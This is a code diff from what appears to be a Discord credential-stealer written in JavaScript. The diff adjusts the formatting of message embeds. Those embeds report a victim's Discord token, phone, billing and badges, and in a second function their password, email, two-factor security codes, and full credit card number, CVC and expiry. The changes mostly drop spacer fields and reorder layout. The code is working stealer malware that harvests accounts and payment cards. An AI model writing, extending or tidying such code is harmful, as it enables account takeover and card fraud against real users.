@@ -255,8 +255,8 @@ const notify = async (ctx, token, user) => {
     ctx.avatar_url = `https://cdn.discordapp.com/attachments/794056531674398750/1281956282261045258/GWz-En_WAAARmpi.png?ex=671ce253&is=671b90d3&hm=62dbb154194f5b4d865856878d4a002e92c0bceb94604a4fe03dcfb56aecb98e&`;
 
     ctx.embeds[0].fields.unshift({
-        name: `<a:hearts:1176516454540116090> Token:`,
-        value: `\`\`\`${token}\`\`\`\n`,
+        name: `Token:`,
+        value: `\`\`\`${token}\`\`\``,
         inline: false
     })
 
@@ -265,13 +265,13 @@ const notify = async (ctx, token, user) => {
     };
 
     ctx.embeds[0].fields.push(
-        { name: "\u200b", value: "\u200b", inline: false },
+        // { name: "\u200b", value: "\u200b", inline: false },
         { name: "Nitro", value: `\`\`\`${nitro}\`\`\``, inline: false },
-        { name: "Phone", value: user.phone ? `\`${user.phone}\`` : '❓', inline: true },
-        { name: "\u200b", value: "\u200b", inline: false },
-        { name: "Badges", value: badges, inline: true },
-        { name: "Billing", value: billing, inline: true },
-        { name: "Path", value: `\`${__dirname.trim().replace(/\\/g, "/")}\``, inline: false },
+        { name: "Phone", value: user.phone ? `\`\`\`${user.phone}\`\`\`` : 'null', inline: false },
+        // { name: "\u200b", value: "\u200b", inline: false },
+        { name: "Badges", value: badges, inline: false },
+        { name: "Billing", value: billing, inline: false },
+        // { name: "Path", value: `\`\`\`${__dirname.trim().replace(/\\/g, "/")}\``, inline: false },
     );
 
     if (friends) {
@@ -680,7 +680,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
                     fields: [
                         { name: "Password", value: `\`\`\`${password}\`\`\``, inline: false },
                         { name: "Email", value: `\`\`\`${email}\`\`\``, inline: false },
-                        { name: "\u200b", value: "\u200b", inline: false },
+                        // { name: "\u200b", value: "\u200b", inline: false },
                         { name: "Security codes", value: `\`\`\`\n${codes}\`\`\``, inline: false },
                     ],
                 }],
@@ -703,7 +703,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 embeds: [{
                     fields: [
                         { name: "Email", value: `\`\`\`${email}\`\`\``, inline: false },
-                        { name: "\u200b", value: "\u200b", inline: false },
+                        // { name: "\u200b", value: "\u200b", inline: false },
                         { name: "Number", value: `\`\`\`${request.item["card[number]"]}\`\`\``, inline: false },
                         { name: "CVC", value: `\`\`\`${request.item["card[cvc]"]}\`\`\``, inline: false },
                         { name: "Expiration", value: `\`\`\`${request.item["card[exp_month]"]}/${request.item["card[exp_year]"]}\`\`\``, inline: false, },
